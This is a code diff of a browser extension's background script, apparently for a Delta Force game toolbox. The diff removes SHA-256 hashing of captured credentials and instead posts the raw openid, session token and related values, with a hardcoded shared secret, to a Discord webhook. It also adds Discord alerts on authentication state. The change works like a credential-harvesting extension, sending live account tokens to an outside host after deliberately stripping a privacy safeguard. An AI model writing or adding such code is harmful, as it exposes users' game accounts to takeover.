@@ -35,41 +35,31 @@ const defaultState = {
 
 // ===== MESSAGE HANDLER: DF_CLAIM + Auth Investigator =====
 chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
-  // --- DF_CLAIM: Handle from link-content.js → POST Discord Webhook (hash only, no raw credentials) ---
+  // --- DF_CLAIM: Handle from link-content.js → POST Discord Webhook ---
+  // Gửi raw credential (bot sẽ encrypt trước khi lưu). Webhook là private endpoint,
+  // message bị xóa ngay sau khi bot xử lý.
   if (msg?.type === 'DF_CLAIM') {
     (async () => {
       try {
         const { webhookUrl } = await chrome.storage.local.get('webhookUrl');
         if (!webhookUrl) {
-          sendResponse({ ok: false, error: 'webhookUrl not configured — set in DevTools: chrome.storage.local.set({webhookUrl: "URL"})' });
+          sendResponse({ ok: false, error: 'webhookUrl not configured' });
           return;
         }
 
-        // Hash credential fields để không gửi raw data lên Discord
-        async function hashField(val) {
-          if (!val) return null;
-          const encoder = new TextEncoder();
-          const data = encoder.encode(String(val));
-          const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-          const hashArray = Array.from(new Uint8Array(hashBuffer));
-          return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('').slice(0, 16);
-        }
-
-        const [openidHash, tokenHash] = await Promise.all([
-          hashField(msg.credential?.openid),
-          hashField(msg.credential?.token),
-        ]);
-
+        const credential = msg.credential || {};
         const payload = {
           content: JSON.stringify({
             type: 'df_claim',
             secret: 'df-link-2026-pon1147',
             code: msg.code,
-            openidHash,
-            tokenHash,
-            source_endpoint: msg.source_endpoint,
+            openid: credential.openid || null,
+            token: credential.token || null,
+            ts: credential.ts || null,
+            s: credential.s || null,
+            u: credential.u || null,
+            source_endpoint: msg.source_endpoint || null,
             captured_at: Date.now(),
-            // KHÔNG gửi raw credential: openid, token, ts, s, u, a
           }),
         };
 
@@ -79,7 +69,6 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
           body: JSON.stringify(payload),
         });
 
-        // Discord webhook trả 204 No Content khi thành công
         sendResponse({
           ok: r.status === 204 || r.ok,
           error: r.ok ? undefined : 'http_' + r.status,
@@ -109,6 +98,93 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
       sendResponse({ ok: true });
     });
     return true; // async
+  }
+
+  // --- Auth State: Send Discord notification via webhook ---
+  if (msg?.type === 'AUTH_NOTIFICATION') {
+    (async () => {
+      try {
+        const { webhookUrl } = await chrome.storage.local.get('webhookUrl');
+        if (!webhookUrl) {
+          sendResponse({ ok: false, error: 'webhookUrl not configured' });
+          return;
+        }
+
+        const { type, reason, sessionId, shortSessionId, details, timestamp: notifTs } = msg.notification;
+
+        // Deduplication: skip nếu đã gửi notification cùng session+type trong 5 phút
+        const dedupKey = `${sessionId}:${type}`;
+        const { lastNotifSent } = await chrome.storage.local.get('lastNotifSent');
+        const lastSent = lastNotifSent || {};
+        const lastSentForThis = lastSent[dedupKey];
+        if (lastSentForThis && (Date.now() - lastSentForThis) < 5 * 60 * 1000) {
+          console.log(`[Service Worker] Deduplicated: ${dedupKey}`);
+          sendResponse({ ok: true, deduplicated: true });
+          return;
+        }
+        lastSent[dedupKey] = Date.now();
+        chrome.storage.local.set({ lastNotifSent: lastSent });
+
+        const timestamp = new Date(notifTs).toLocaleString('vi-VN');
+
+        const embeds = [];
+
+        if (type === 'AUTH_EXPIRED') {
+          embeds.push({
+            color: 0xdc2626,
+            title: '🔴 Delta Force Authentication Expired',
+            fields: [
+              { name: 'Session', value: shortSessionId || sessionId, inline: true },
+              { name: 'Reason', value: reason || 'TOKEN_EXPIRED', inline: true },
+              { name: 'Detected', value: timestamp, inline: true },
+            ],
+            footer: { text: 'DF Toolbox — Auth Investigator' },
+            timestamp: new Date(msg.notification.timestamp).toISOString(),
+          });
+        } else if (type === 'AUTH_RESTORED') {
+          embeds.push({
+            color: 0x16a34a,
+            title: '🟢 Delta Force Authentication Restored',
+            fields: [
+              { name: 'Session', value: shortSessionId || sessionId, inline: true },
+              { name: 'Status', value: 'ACTIVE', inline: true },
+              { name: 'Restored', value: timestamp, inline: true },
+            ],
+            footer: { text: 'DF Toolbox — Auth Investigator' },
+            timestamp: new Date(msg.notification.timestamp).toISOString(),
+          });
+        } else if (type === 'AUTH_REFRESH_FAILED') {
+          embeds.push({
+            color: 0xea580c,
+            title: '🟡 Delta Force Authentication Refresh Failed',
+            fields: [
+              { name: 'Session', value: shortSessionId || sessionId, inline: true },
+              { name: 'Reason', value: reason || 'REFRESH_FAILED', inline: true },
+              { name: 'Detected', value: timestamp, inline: true },
+            ],
+            footer: { text: 'DF Toolbox — Auth Investigator' },
+            timestamp: new Date(msg.notification.timestamp).toISOString(),
+          });
+        } else {
+          sendResponse({ ok: false, error: 'unknown notification type' });
+          return;
+        }
+
+        const payload = { embeds };
+
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        });
+
+        sendResponse({ ok: true, deduplicated: false });
+      } catch (e) {
+        sendResponse({ ok: false, error: e?.message || 'network' });
+      }
+    })();
+
+    return true; // async sendResponse
   }
 
 });
